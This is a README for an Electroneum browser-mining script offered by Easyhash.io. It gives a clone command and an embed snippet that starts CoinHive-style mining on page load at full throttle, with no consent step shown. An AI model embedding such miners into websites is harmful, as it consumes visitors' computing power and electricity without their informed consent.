# Electroneum Webminer
Integrate Electroneum mining directly on your website.

Easyhash.io offers a JavaScript miner for the Electroneum Blockchain that you can embed in your website. Your users run the miner directly in their Browser and mine ETN for you in turn for an ad-free experience.

## Prerequisites
* Create an Electroneum Wallet.
* Embed the code into your website.
* Change  ```YOUR_ELECTRONEUM_WALLET_ADDRESS``` with your actuall Electroneum Public Wallet Address.

## Usage
Clone ```js``` folder into your website.
```
git clone https://github.com/easyhash/electroneum-easyhash-webminer.git
```

Embed the following code into your website.
```
<script src="js/web-client.min.js"></script>
<script>
	miner = new CoinHive.Anonymous('YOUR_ELECTRONEUM_WALLET_ADDRESS', {
		threads: 2,			// The number of threads the miner should start with.
		autoThreads: false,		// Whether to automatically adjust the number of threads for optimal performance.
		throttle: 0			// The fraction of time that threads should be idle.
	});

	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
</script>
```

## Stats
Stats can be found at ```https://easyhash.io/stats/YOUR_ELECTRONEUM_WALLET_ADDRESS```
Here you will find your total Hashrate, Estimated Profit, ETN Paid and a complete Payment History.
